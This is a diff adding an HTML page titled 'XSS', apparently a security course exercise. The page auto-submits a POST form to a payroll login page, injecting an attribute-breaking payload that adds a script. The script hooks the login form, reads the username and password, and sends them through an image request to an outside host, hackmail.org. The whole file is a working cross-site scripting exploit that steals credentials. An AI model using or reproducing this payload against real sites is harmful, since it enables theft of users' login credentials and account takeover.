@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSS</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form action="http://payroll.gatech.edu/index.php" onsubmit="" method="POST">
+        <input type="hidden" name="login" value = '">
+        <script>
+                document.forms[1].addEventListener("submit", inject);
+            
+                function inject(){
+                    var usrname = document.getElementsByName("login")[0].value;
+                    var pw = document.getElementsByName("pw")[0].value;
+                    javascript:void((new Image()).src="http://hackmail.org/sendmail.php?"
+                    + "&username=JSVUYXJnZXQyLVRoaXNPbmVDYW5CZURpZmZpY3VsdC1FYXN0ZXJFZ2dTcHJpbmcyMDIyJSU" 
+                    + "&payload=" + usrname + " " + pw 
+                    + "&random=" + Math.random());
+                }
+        </script>
+        <br class = "'>
+    </form>
+  </body>
+</html>
